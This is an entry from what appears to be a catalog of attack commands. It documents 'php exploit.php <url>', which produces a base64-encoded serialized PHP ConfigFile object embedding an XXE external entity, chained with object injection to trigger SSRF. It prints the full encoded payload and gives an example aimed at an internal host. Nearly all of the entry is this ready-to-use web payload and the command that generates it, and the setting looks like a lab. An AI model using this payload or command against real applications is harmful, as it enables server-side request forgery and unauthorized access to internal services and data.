---
data: 'php exploit.php http://localhost:1337/status'
tags:
  - php
  - xxe
type: command
output: Base64 string of serialized array for use in import request
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:50.019Z'
id: a5b546cf-e6ca-4627-b0ba-98d780efb0b6
verified: false
validated: true
submitted: true
---
# generate-php-serialized-configfile-with-xxe

## Command

```bash
php exploit.php http://localhost:1337/status
```

## Description

Runs a PHP script to generate a base64-encoded serialized ConfigFile object with embedded XXE payload targeting the provided URL.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $argv[1] | XXE entity URL, e.g., http://localhost:1337/status | Yes |

## Examples

### Basic Usage

```bash
php exploit.php http://localhost:1337/status
```

### Advanced Usage

```bash
php exploit.php "http://internal:1337/debug"
```

## Expected Output

Base64 string like YToxOntpOjA7TzoxMDoiQ29uZmlnRmlsZSI6MTp7czoxMDoiY29uZmlnX3JhdyI7czoyMzk6Ijw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IlVURi04Ij8+IDwhRE9DVFlQRSBmb28gWzwhRUxFTUVOVCBmb28gQU5ZID48IUVOVElUWSB4eGUgU1lTVEVNICJodHRwOi8vbG9jYWxob3N0OjEzMzcvc3RhdHVzIiA+XT48bm90ZT48dG9wdGV4dD5Ub3ZlPC90b3B0ZXh0Pjxib3R0b210ZXh0Pkphbmk8L2JvdHRvbXRleHQ+PHR5cGU+UmVtaW5kZXI8L3R5cGU+PHRlbXBsYXRlPiZ4eGU7PC90ZW1wbGF0ZT48L25vdGU+Ijt9fQ==

## Related

- [[Related Procedure: Exploit-PHP-Object-Injection-to-Trigger-XXE-via-SSRF]]
